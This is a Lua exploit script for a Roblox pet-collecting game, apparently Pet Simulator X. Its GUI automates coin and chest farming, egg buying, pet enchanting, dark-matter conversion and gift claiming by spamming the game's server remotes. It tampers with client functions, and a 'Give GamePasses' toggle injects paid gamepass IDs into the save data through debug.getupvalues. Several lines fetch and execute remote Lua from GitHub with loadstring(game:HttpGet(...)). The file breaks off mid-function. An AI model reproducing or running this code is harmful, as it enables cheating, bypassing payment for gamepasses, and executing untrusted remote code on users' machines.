--[[
  dont try to skid :)
]]


spawn(function()
--loadstring(game:HttpGet("https://raw.githubusercontent.com/si1nnx/psxx/main/g"))()

Spawn(function()
    getgenv().collectalllootbags = true
    while collectalllootbags do
        wait()
        for i,v in pairs(game:GetService("Workspace")["__THINGS"].Lootbags:GetChildren()) do
           if v.ClassName == "MeshPart" then
               v.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
           end
        end
        wait(1)
    end
end)

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()
local u = library:CreateWindow("Main 1") 
local a = u:CreateFolder("Auto Farm")


local function SecondsToClock(seconds) 
    local days = math.floor(seconds / 86400)
    seconds = seconds - days * 86400
    local hours = math.floor(seconds / 3600 )
    seconds = seconds - hours * 3600
    local minutes = math.floor(seconds / 60) 
    seconds = seconds - minutes * 60

    return string.format("%d d, %d h, %d m, %d s.",days,hours,minutes,seconds)
end


local MethodList = {
    'Normal', 
    'Chest', 
    'Multi Target', 
    'Lowest Value (Multi)', 
    'Highest Value', 
    '[TESTING] Highest Value', 
    'Nearest' 
}    


a:Dropdown("Method", MethodList,"string",function(methodfunc)
    if methodfunc then
        _G.methodfunc = methodfunc
    end
    print("Method: ", methodfunc)
end)
          

local ItemToFarmList = {
    'All',
    'Magma Chest', 
    'Enchanted Chest', 
    'Hell Chest', 
    'Haunted Chest', 
    'Angel Chest', 
    'Grand Heaven Chest', 
    'Giant Tech Chest', 
    'Giant Steampunk Chest', 
    'Giant Alien Chest',
    'Giant Hacker Chest',
    "Giant Ocean Chest"
}
a:Dropdown("Item To Farm", ItemToFarmList,"string",function(itemtofarmfunc)
    if itemtofarmfunc then
        _G.itemtofarmfunc = itemtofarmfunc
    end
    print("Selected Item: ", itemtofarmfunc)
end)


----------------------------------------------------------------------------------------------------------------------
local GameLibrary = require(game:GetService("ReplicatedStorage"):WaitForChild("Framework"):WaitForChild("Library"))
local Network = GameLibrary.Network
local Run_Service = game:GetService("RunService")
local rs = Run_Service.RenderStepped
local CurrencyOrder = {"Rainbow Coins", "Halloween Candy", "Tech Coins", "Fantasy Coins", "Coins", "Diamonds",}

local IMightKillMyselfCauseOfThis = {
        --Misc
        ['VIP'] = {'VIP'};
        --Spawn
        ['Town'] = {'Town', 'Town FRONT'};
        ['Forest'] = {'Forest', 'Forest FRONT'};
        ['Beach'] = {'Beach', 'Beach FRONT'};
        ['Mine'] = {'Mine', 'Mine FRONT'};
        ['Winter'] = {'Winter', 'Winter FRONT'};
        ['Glacier'] = {'Glacier', 'Glacier Lake'};
        ['Desert'] = {'Desert', 'Desert FRONT'};
        ['Volcano'] = {'Volcano', 'Volcano FRONT'};
        -- Fantasy init
        ['Enchanted Forest'] = {'Enchanted Forest', 'Enchanted Forest FRONT'};
        ['Ancient'] = {'Ancient'};
        ['Samurai'] = {'Samurai', 'Samurai FRONT'};
        ['Candy'] = {'Candy'};
        ['Haunted'] = {'Haunted', 'Haunted FRONT'};
        ['Hell'] = {'Hell'};
        ['Heaven'] = {'Heaven'};
        -- Tech
        ['Ice Tech'] = {'Ice Tech'};
        ['Tech City'] = {'Tech City'; 'Tech City FRONT'};
        ['Dark Tech'] = {'Dark Tech'; 'Dark Tech FRONT'};
        ['Steampunk'] = {'Steampunk'; 'Steampunk FRONT'};
        ['Alien Lab'] = {'Alien Lab'; 'Alien Lab FRONT'};
        ['Alien Forest'] = {'Alien Forest'; 'Alien Forest FRONT'};
        ['Glitch'] = {'Glitch'; 'Glitch FRONT'};
        ['Hacker Portal'] = {'Hacker Portal'; 'Hacker Portal FRONT'};
        ['Axolotl Ocean'] = {'Axolotl Ocean'; 'Axolotl Ocean FRONT'};
        ['Axolotl Deep Ocean'] = {'Axolotl Deep Ocean'; 'Axolotl Deep Ocean FRONT'};
        ['Axolotl Cave'] = {'Axolotl Cave'; 'Axolotl Cave FRONT'};
    }

    local AreaListLoc = { --These match the IMightKillMyselfCuaseOfThis table
        'All'; 'VIP';
        'Town'; 'Forest'; 'Beach'; 'Mine'; 'Winter'; 'Glacier'; 'Desert'; 'Volcano';
        'Enchanted Forest'; 'Ancient'; 'Samurai'; 'Candy'; 'Haunted'; 'Hell'; 'Heaven';
        'Ice Tech'; 'Tech City'; 'Dark Tech'; 'Steampunk'; 'Alien Lab'; 'Alien Forest'; 'Glitch'; 'Hacker Portal';
        'Axolotl Ocean'; 'Axolotl Deep Ocean'; 'Axolotl Cave';
    }
    
    local Chests = {
        'All';
        -- Spawn
        "Magma Chest",
        -- Fantasy
        "Enchanted Chest", "Hell Chest", "Haunted Chest", "Angel Chest", "Grand Heaven Chest",
        -- Tech
        "Giant Tech Chest"; "Giant Steampunk Chest"; 'Giant Alien Chest'; 'Giant Hacker Chest';
        --The Void
        "Giant Ocean Chest";
        
    }
a:Dropdown("Select Location", AreaListLoc,"string",function(mapafunc)
    if mapafunc then
        _G.mapafunc = mapafunc
    end
    print("Area: ", mapafunc)
end)
----------------------------------------------------------------------------------------------------------------------
 
   
    local AreaWorldTable = {}
    for _, v in pairs(game:GetService("ReplicatedStorage").Game.Coins:GetChildren()) do
        for _, b in pairs(v:GetChildren()) do
            table.insert(AreaWorldTable, b.Name)
        end
        table.insert(AreaWorldTable, v.Name)
    end
    
    -------------------------
    
    function AllChests()
        local returntable = {}
        local ListCoins = game.workspace['__THINGS']['__REMOTES']["get coins"]:InvokeServer({})[1]
        for i,v in pairs(ListCoins) do
            local shit = v
            shit["index"] = i
            for aa,bb in pairs(AreaWorldTable) do
                if string.find(v.n, bb) then
                    local thing = string.gsub(v.n, bb.." ", "")
                    if table.find(Chests, thing) then
                        shit.n = thing
                        table.insert(returntable, shit)
                    end
                end
            end
        end
        return returntable
    end
    
    -------------------------------
    
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "buy egg")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "join coin")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("a", "farm coin")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("a", "claim orbs")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("a", "change pet target")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "get trade")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "add trade pet")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "remove trade pet")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "convert to dark matter")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "redeem dark matter pet")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "redeem rank rewards")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "redeem vip rewards")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("a", "toggle setting")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("a", "activate boost")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "use golden machine")
    workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "use rainbow machine")
    -------------------------------
    
    function FarmCoin(CoinID, PetID)
        game.workspace['__THINGS']['__REMOTES']["join coin"]:InvokeServer({[1] = CoinID, [2] = {[1] = PetID}})
        game.workspace['__THINGS']['__REMOTES']["farm coin"]:FireServer({[1] = CoinID, [2] = PetID})
    end
    
    -------------------------------

    local Library = require(game:GetService("ReplicatedStorage").Framework.Library)
    local IDToName = {}
    local NameToID = {}
    for i,v in pairs(Library.Directory.Pets ) do
        IDToName[i] = v.name
        NameToID[v.name] = i
    end
    
    function GetMyPets()
           local returntable = {}
           for i,v in pairs(GameLibrary.Save.Get().Pets) do
               if v.e then 
                   table.insert(returntable, v.uid)
               end
           end
           return returntable
        end
    
    function GetPets()
            local MyPets = {}
            for i,v in pairs(GameLibrary.Save.Get().Pets) do
                    local ThingyThingyTempTypeThing = (v.g and 'Gold') or (v.r and 'Rainbow') or (v.dm and 'Dark Matter') or 'Normal'
                    local TempString = ThingyThingyTempTypeThing .. IDToName[v.id]
                    if MyPets[TempString] then
                        table.insert(MyPets[TempString], v.uid)
                    else
                        MyPets[TempString] = {}
                        table.insert(MyPets[TempString], v.uid)
                    end
                --end
            end
            return MyPets
        end
    function GetCoins(area, exclude)
        exclude = exclude or {}
        local Areas = (IMightKillMyselfCauseOfThis)
        local returntable = {}
        local ListCoins = game.workspace['__THINGS']['__REMOTES']["get coins"]:InvokeServer({})[1]
        for i,v in pairs(ListCoins) do
            if _G.mapafunc == 'All' or table.find(Areas[_G.mapafunc], v.a) and not table.find(exclude ,v.n) then
                local shit = v
                shit["index"] = i
                table.insert(returntable, shit)
             end
        end
        return returntable
    end
    function GetCoinTable(area, Type, exclude)
        exclude = exclude or {}
        local CoinTable = GetCoins(area, exclude)
        local function getKeysSortedByValue(tbl, sortFunction)
            local keys = {}
            for key in pairs(tbl) do
                table.insert(keys, key)
            end
            table.sort(
                keys,
                function(a, b)
                    return sortFunction(tbl[a].h, tbl[b].h)
                end
            )
            return keys
        end
        local sortedKeys
        if Type == 'Highest' then
            sortedKeys = getKeysSortedByValue(CoinTable, function(a, b) return a > b end)
        elseif Type == 'Lowest' then
            sortedKeys = getKeysSortedByValue(CoinTable, function(a, b) return a < b end)
        end
        local newCoinTable = {}
    
        for i,v in pairs(sortedKeys) do
            table.insert(newCoinTable, CoinTable[v])
        end
    
        return newCoinTable
    end
    
    -------------------------
    
    if _G.MyConnection then _G.MyConnection:Disconnect() end
        _G.MyConnection = game.Workspace.__THINGS.Orbs.ChildAdded:Connect(function(Orb)
            game.Workspace.__THINGS.__REMOTES["claim orbs"]:FireServer({{Orb.Name}})
        end)
    
    a:Toggle("Farming Toggle",function(bool)
    spawn(function()
    if bool then
        _G.FarmingToggle = true
        wait()
    elseif farmingtogglefunc == false or destroygui then
        wait()
        _G.FarmingToggle = false
    end
        
            local CurrentFarmingPets = {}
            while _G.FarmingToggle do
                wait()
                local pethingy = GetMyPets()
                local cointhiny = nil
                if _G.methodfunc == 'Normal' then
                    local cointhiny = GetCoins(_G.mapafunc)
                    for i = 1, #cointhiny do
                        if _G.FarmingToggle and game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) then
                            for _, bb in pairs(pethingy) do
                                coroutine.wrap(function()
                                    FarmCoin(cointhiny[i].index, bb)
                                end)()
                            end
                            repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) or not _G.FarmingToggle or _G.methodfunc ~= 'Normal'
                        end
                    end
                elseif _G.methodfunc == 'Chest' then
                    for i,v in pairs(AllChests()) do
                        if (v.n == _G.itemtofarmfunc) or (_G.itemtofarmfunc == 'All') then
                            local starttick = tick()
                            for a, b in pairs(pethingy) do
                                coroutine.wrap(function()
                                    FarmCoin(v.index, b)
                                end)()
                            end
                            repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(v.index) or #game:GetService("Workspace")["__THINGS"].Coins[v.index].Pets:GetChildren() == 0 or not _G.FarmingToggle or _G.methodfunc ~= 'Chest'
                        end
                    end
                elseif _G.methodfunc == 'Multi Target' then
                    local cointhiny = GetCoins(_G.mapafunc)
                    for i = 1, #cointhiny do
                        if not CurrentFarmingPets[pethingy[i%#pethingy+1]] or CurrentFarmingPets[pethingy[i%#pethingy+1]] == nil then
                            coroutine.wrap(function()
                                CurrentFarmingPets[pethingy[i%#pethingy+1]] = 'Farming'
                                FarmCoin(cointhiny[i].index, pethingy[i%#pethingy+1])
                                repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) or #game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index).Pets:GetChildren() == 0 or not _G.FarmingToggle or _G.methodfunc ~= 'Multi Target'
                                CurrentFarmingPets[pethingy[i%#pethingy+1]] = nil
                            end)()
                        end
                    end
    
                elseif _G.methodfunc == 'Lowest Value (Multi)' then
                    local cointhiny = GetCoinTable(_G.mapafunc, "Lowest")
                    for i = 1, (#cointhiny >= #pethingy and #pethingy or #cointhiny) do
                        if not CurrentFarmingPets[pethingy[i%#pethingy+1]] or CurrentFarmingPets[pethingy[i%#pethingy+1]] == nil then
                            coroutine.wrap(function()
                                CurrentFarmingPets[pethingy[i%#pethingy+1]] = 'Farming'
                                FarmCoin(cointhiny[i].index, pethingy[i%#pethingy+1])
                                repeat task.wait(0.0001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index) or #game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[i].index).Pets:GetChildren() == 0 or not _G.FarmingToggle or _G.methodfunc ~= 'Lowest Value (Multi)'
                                CurrentFarmingPets[pethingy[i%#pethingy+1]] = nil
                            end)()
                        end
                    end
                elseif _G.methodfunc == 'Highest Value' then
                    local cointhiny = GetCoinTable(_G.mapafunc, "Highest")
                    if #cointhiny >= 1 then
                        for a,b in pairs(pethingy) do
                            coroutine.wrap(function()
                                FarmCoin(cointhiny[1].index, b) 
                            end)()
                        end
                        repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[1].index) or #game:GetService("Workspace")["__THINGS"].Coins[cointhiny[1].index].Pets:GetChildren() == 0 or not _G.FarmingToggle or _G.methodfunc ~= 'Highest Value'
                    else
                        task.wait()
                    end
    
                elseif _G.methodfunc == 'Highest Value(Test)' then
                    local cointhiny = GetCoinTable(_G.mapafunc, "Highest")
                    if #cointhiny >= 3 then
                        local CurrentFarmingPets = {}
                        for a = 1, 3 do
                            coroutine.wrap(function()
                                if CurrentFarmingPets[a] == nil then
                                    for petnum = a, #pethingy, 3 do
                                        coroutine.wrap(function()
                                            if not CurrentFarmingPets[a] then CurrentFarmingPets[a] = {} end
                                            if CurrentFarmingPets[a] ~= nil and game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[a].index) and not table.find(CurrentFarmingPets[a], pethingy[petnum]) then
                                                table.insert(CurrentFarmingPets[a], pethingy[petnum])
                                                FarmCoin(cointhiny[a].index, pethingy[petnum]) 
                                            end
                                        end)()
                                    end
                                    repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(cointhiny[a].index) or #game:GetService("Workspace")["__THINGS"].Coins[cointhiny[a].index].Pets:GetChildren() == 0  or not _G.FarmingToggle or _G.methodfunc ~= '[TESTING] Highest Value'
                                    CurrentFarmingPets[a] = nil
                                end
                            end)()
                        end
                    else
                        task.wait()
                    end
                elseif _G.methodfunc == 'Nearest' then
                    local cointable = game:GetService("Workspace")["__THINGS"].Coins:GetChildren()
                    table.sort(cointable, function(i, v)
                        return (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.POS.Position).magnitude < (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.POS.Position).magnitude
                    end)
                    local NearestOne = cointable[1]
                    if NearestOne ~= nil then
                        for a,b in pairs(pethingy) do
                            coroutine.wrap(function()
                                if NearestOne ~= nil then
                                    FarmCoin(NearestOne.Name, b)
                                end
                            end)()
                        end
                        repeat task.wait(0.001) until not game:GetService("Workspace")["__THINGS"].Coins:FindFirstChild(NearestOne.Name) or #game:GetService("Workspace")["__THINGS"].Coins[NearestOne.Name].Pets:GetChildren() == 0
                    else
                        task.wait()
                    end
                end
            end
        end)
        end)
    
    
a:Toggle("Auto Triple Coins",function(bool)
    getgenv().autocoin = bool
        if bool then
        spawn(function()
        while autocoin do wait(1)
            if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts:FindFirstChild("Triple Coins") then
                    workspace.__THINGS.__REMOTES["activate boost"]:FireServer({[1] = "Triple Coins"})
                print("Triple Coin Boost Checked")
            end
        end
        end)
    end
end)


a:Toggle("Auto Triple Damage",function(bool)
    getgenv().autodamage = bool
    if bool then
        spawn(function()
        while autodamage do wait(1)
            if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts:FindFirstChild("Triple Damage") then
                workspace.__THINGS.__REMOTES["activate boost"]:FireServer({[1] = "Triple Damage"})
            print("Triple Damage Boost Checked")
            end
            end
        end)
    end
end)




local b = u:CreateFolder("Auto Egg")

local pathToScript = game.Players.LocalPlayer.PlayerScripts.Scripts.Game['Open Eggs']
local oldFunc = getsenv(pathToScript).OpenEgg

b:Toggle("Remove Egg Animation",function(delanimation)
    if delanimation then 
        getsenv(pathToScript).OpenEgg = function() return end 
        print("Remove Egg Animation:",delanimation)
    else
        getsenv(pathToScript).OpenEgg = oldFunc
        print("Remove Egg Animation:",delanimation)
    end 
end)


b:Toggle("Triple Egg Gamepass",function(triplegamepass)
_G.TripleEgg = triplegamepass
    if triplegamepass then
    print("Triple Egg Gamepass:", triplegamepass)
    else
    print("Triple Egg Gamepass:", triplegamepass)
    end
end)


b:Box("Type Egg Name","value",function(eggor)
    _G.Egg = eggor;
    print(eggor, "Selected")
end)


local Eggs = {} 
for i,v in pairs(game.ReplicatedStorage.Game.Eggs:GetChildren()) do 
    for i2,v2 in pairs(v:GetChildren()) do 
        table.insert(Eggs, v2.Name)
    end 
end

b:Dropdown("Select Egg", Eggs,"string",function(eggor)
    if eggor then
        _G.Egg = eggor
        print(eggor, "Selected")
    end
end)
----------------------------

b:Toggle("Auto Open Egg", function(dropegg)
shared.toggle3drop = dropegg
end)
local openeegg = eggor
game:GetService("RunService").RenderStepped:connect(function()
if shared.toggle3drop then
    --print("Egg: ", _G.Egg)
    --print("Triple Egg GamePasse: ", _G.TripleEgg)
    local ohTable1 = {
        [1] = _G.Egg,
        [2] = _G.TripleEgg
    }
    workspace.__THINGS.__REMOTES["buy egg"]:InvokeServer(ohTable1)
    wait(0.5)
    end
end)


local u = library:CreateWindow("Main 2") 
local c = u:CreateFolder("Auto Enchant")


c:Slider("Select Count",{min = 0;max = 6;precise = false;},function(countcombinefunc)
    if countcombinefunc then
        _G.CountCombineFunc1 = countcombinefunc
    end
end)


------------------------------------------

c:Toggle("Gold",function(bool)
    _G.ToggleGold = bool
    if bool then
    print("Toggle Gold:", bool)
    else
    print("Toggle Gold:", bool)
    end
end)


c:Toggle("Rainbow",function(bool)
    _G.ToggleRainbow = bool
if bool then
    print("Toggle Rainbow:", bool)
    else
    print("Toggle Rainbow:", bool)
end
end)


c:Toggle("Start Auto Gold/Rainbow",function(bool)
    _G.AutoCom = bool
if bool then
    print("Toggle Auto Gold/Rainbow:", bool)
    else
    print("Toggle Auto Gold/Rainbow:", bool)
end
spawn(function()
while wait() and _G.AutoCom do
    for i, v in pairs(GetPets()) do
        if #v >= _G.CountCombineFunc1 and _G.AutoCom then
            if string.find(i, "Normal") and _G.AutoCom and _G.ToggleGold then
                local Args = {}
                for eeeee = 1, _G.CountCombineFunc1 do
                    Args[#Args+1] = v[#Args+1]
                end
                Library.Network.Invoke("use golden machine", Args)

            elseif string.find(i, "Gold") and _G.AutoCom and _G.ToggleRainbow then
                local Args = {}
                for eeeee = 1, _G.CountCombineFunc1 do
                    Args[#Args+1] = v[#Args+1]
                end
                Library.Network.Invoke("use rainbow machine", Args)
            end
        end
    end
end
end)
end)




local e = u:CreateFolder("Auto Dark Matter")

e:Button("Remaining Time", function()
    local PetList = {}
    for i,v in pairs(GameLibrary.Directory.Pets) do
    PetList[i] = v.name
    end

    local returnstring = ""
    for i,v in pairs(GameLibrary.Save.Get().DarkMatterQueue) do
        local timeleft = 'Done!'
        if math.floor(v.readyTime - os.time()) > 0 then
            timeleft = SecondsToClock(math.floor(v.readyTime - os.time()))
        end
        local stringthing = PetList[v.petId] .." will be ready in: ".. timeleft
        returnstring = returnstring .. stringthing .. "\n"
    end
    require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New(returnstring)
end)


e:Box("Type Pet Name","value",function(value)
    _G.NameOfPet = value
    print(value, "Selected")
end)


local GameLibrary = require(game:GetService("ReplicatedStorage"):WaitForChild("Framework"):WaitForChild("Library"))
local IDToName = {}
local NameToID = {}
local PettoRarity = {}
local RarityTable = {}
local PetNamesTable = {}
local PetNamesTable = {}

for i,v in pairs(GameLibrary.Directory.Pets) do
    IDToName[i] = v.name
    NameToID[v.name] = i
    PettoRarity[i] = v.rarity
    if not table.find(RarityTable, v.rarity) then
        table.insert(RarityTable, v.rarity)
    end
    table.insert(PetNamesTable, v.name)
end


e:Dropdown("Select Pet", PetNamesTable,"string",function(value)

if value then
_G.NameOfPet = value
print("Selected Dark Matter Count: ", value)
end
end)

-------------------------------

e:Slider("Select Dark Matter Count",{min = 0;max = 6;precise = false;},function(value)
if value then
    _G.CountDarkMatterFunc1 = value
    print("Selected Dark Matter Count: ", value)
end
end)


-------------------------------

e:Toggle("Auto Make Dark Matter", function(bool)
_G.AutoMakeDarkMatter = bool    
if bool then
    print("Auto Make Dark Matter:", bool)
    else
    print("Auto Make Dark Matter:", bool)
end

spawn(function()
while task.wait() and _G.AutoMakeDarkMatter do
    local Save = GameLibrary.Save.Get()
    local Slots = Save.DarkMatterSlots
    local Queued = 0
    for a, b in pairs(Save.DarkMatterQueue) do
        Queued = Queued + 1 
    end
    local Slots = Slots - Queued
    for count = 1, Slots do
        if Slots - count >= 0 then
            local PetList = {}
            for i,v in pairs(GameLibrary.Save.Get().Pets) do
                if #PetList < _G.CountDarkMatterFunc1 and v.r and IDToName[v.id] == _G.NameOfPet then
                    table.insert(PetList, v.uid)
                end
            end
            if #PetList >= _G.CountDarkMatterFunc1 then
                local tablething = {[1] = {}}
                for eeek = 1, _G.CountDarkMatterFunc1 do
                    tablething[1][eeek] = PetList[eeek]
                end
                workspace.__THINGS.__REMOTES["convert to dark matter"]:InvokeServer(tablething)
            end
        end 
    end
    task.wait(15)
end
end)
end)


-------------------------------
e:Toggle("Auto Claim Dark Matter", function(bool)
_G.AutoClaimDarkMatter = bool
if bool then
    print("Auto Claim Dark Matter:", bool)
    else
    print("Auto Claim Dark Matter:", bool)
end

spawn(function()
while task.wait() and _G.AutoClaimDarkMatter do
    for i,v in pairs(GameLibrary.Save.Get().DarkMatterQueue) do
        if math.floor(v.readyTime - os.time()) < 0 then
            workspace.__THINGS.__REMOTES["redeem dark matter pet"]:InvokeServer({[1] = i})
        end
        end
    task.wait(15)
end
end)
end)




local v = library:CreateWindow("Misc") 
local e = v:CreateFolder("Stuffs")


e:Toggle("Auto Collect Rewards", function(autorewards)
_G.AutoRewards1 = autorewards
if autorewards then
    print("Auto Collect Rewards:",autorewards)
else
    print("Auto Collect Rewards:",autorewards)
end
spawn(function()
while task.wait() and _G.AutoRewards1 do
    workspace.__THINGS.__REMOTES["redeem vip rewards"]:InvokeServer({})
    workspace.__THINGS.__REMOTES["redeem rank rewards"]:InvokeServer({})			
end
end)
end)

e:Toggle("Auto Collect Free Gift",function(freerewards)
getgenv().autocollectfreegifts = freerewards
spawn(function()
    while autocollectfreegifts do
        local args = {
            [1] = {
                [1] = 1
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 2
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 3
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 4
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 5
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 6
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 7
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 8
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 9
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 10
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 11
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        local args = {
            [1] = {
                [1] = 12
            }
        }
        
        workspace.__THINGS.__REMOTES:FindFirstChild("redeem free gift"):InvokeServer(unpack(args))
        wait(0.01)
        end
    end)
end)

e:Toggle("Give GamePasses", function(gamepasses)
    shared.toggle3gamepasses = gamepasses
    game:GetService("RunService").RenderStepped:connect(function()
    if shared.toggle3gamepasses then
        local main = debug.getupvalues(require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library")).Save.Get)[2][game.Players.LocalPlayer].save.Gamepasses
            table.insert(main,18674296)
            table.insert(main,18674298)
            table.insert(main,18674321)
            table.insert(main,21176989)
            table.insert(main,21583760)
            table.insert(main,21641016)
            table.insert(main,22596039)
            table.insert(main,18674307)
        end
    end)
end)

e:Button("Stats Tracker", function()
    require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New("This can lag \n dont use more than 1 time")
    local gamelibrary = require(game:GetService("ReplicatedStorage").Framework.Library)
    local Save = gamelibrary.Save.Get
    local Commas = gamelibrary.Functions.Commas
    local types = {}
    local menus = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right
    for i, v in pairs(menus:GetChildren()) do
        if v.ClassName == 'Frame' and v.Name ~= 'Rank' and not string.find(v.Name, "2") then
            table.insert(types, v.Name)
        end
    end
    
    function get(thistype)
        return Save()[thistype]
    end
    
    menus.Diamonds.LayoutOrder = 99988
    menus['Tech Coins'].LayoutOrder = 99992
    menus['Fantasy Coins'].LayoutOrder = 99994
    menus.Coins.LayoutOrder = 99996
    menus.UIListLayout.HorizontalAlignment = 2
    
    _G.MyTypes = {}
    for i,v in pairs(types) do
        if menus:FindFirstChild(v.."2") then
            menus:FindFirstChild(v.."2"):Destroy()
        end
    end
    for i,v in pairs(types) do
        if not menus:FindFirstChild(v.."2") then
            local tempmaker = menus:FindFirstChild(v):Clone()
            tempmaker.Name = tostring(tempmaker.Name .. "2")
            tempmaker.Parent = menus
            tempmaker.Size = UDim2.new(0, 175, 0, 30)
            tempmaker.LayoutOrder = tempmaker.LayoutOrder + 1
            _G.MyTypes[v] = tempmaker
        end
    end
    menus.Diamonds2.Add.Visible = false
    
    for i,v in pairs(types) do
        spawn(function()
            local megatable = {}
            local imaginaryi = 1
            local ptime = 0
            local last = tick()
            local now = last
            local TICK_TIME = 0.5
            while true do
                if ptime >= TICK_TIME then
                    while ptime >= TICK_TIME do ptime = ptime - TICK_TIME end
                    local currentbal = get(v)
                    megatable[imaginaryi] = currentbal
                    local diffy = currentbal - (megatable[imaginaryi-120] or megatable[1])
                    imaginaryi = imaginaryi + 1
                    _G.MyTypes[v].Amount.Text = tostring(Commas(diffy).." in 60s")
                    _G.MyTypes[v]["Amount_odometerGUIFX"].Text = tostring(Commas(diffy).." in 60s")
                end
                task.wait(0.001)
                now = tick()
                ptime = ptime + (now - last)
                last = now
            end
        end)
    end
    print("Stats Tracker Loaded")
end)



e:Button("Lag Reduction", function()
local function ByeLAG()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Coin Rewards HUD"].Disabled = true
    local a = game:GetService("Workspace")["__DEBRIS"]
    local b = a:Clone()
    b.Parent = a.Parent
    a:Destroy()
    for _,v in pairs(b:GetChildren()) do
        if v.Name == 'RewardBillboard' then
            v:Destroy()
        end
    end
    if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.ShowOtherPets.Toggle.Label.Text == "Yes" then 
        workspace.__THINGS.__REMOTES["toggle setting"]:FireServer({[1] = "ShowOtherPets"})
    end
end
print("Lag Reduction Loaded")
end)


e:Toggle("Ultra Lag Reduce(AFK)", function(gamepasses)
    getgenv().untralagreduce = gamepasses
    game:GetService("RunService").RenderStepped:connect(function()
    if untralagreduce then
        local function ByeLAG()
            game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Coin Rewards HUD"].Disabled = true
                local a = game:GetService("Workspace")["__DEBRIS"]
                local b = a:Clone()
                b.Parent = a.Parent
                a:Destroy()
                for _,v in pairs(b:GetChildren()) do
                    if v.Name == 'RewardBillboard' then
                        v:Destroy()
                    end
                end
                if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.ShowOtherPets.Toggle.Label.Text == "Yes" then 
                    workspace.__THINGS.__REMOTES["toggle setting"]:FireServer({[1] = "ShowOtherPets"})
                end
            end
        end
        while untralagreduce do
            game:GetService("Players")["GlitchGame_ALT"].PlayerGui.Inventory.Enabled = true
            wait(0.5)
            game:GetService("Players")["GlitchGame_ALT"].PlayerGui.Inventory.Enabled = false
            wait(0.5)
        end
    end)
    print("Ultra Lag Reduction Loaded")
end)




e:Button("Pet Counter", function()
    require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New("Pet Counter Started \n Click F9 to check counted pets")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/yochaipetvannesimulatorho/main/petcountgarxa", true))()
end)


local w = library:CreateWindow("Remote Gui") 
local i = w:CreateFolder("Open Gui")

i:Button("Bank", function()
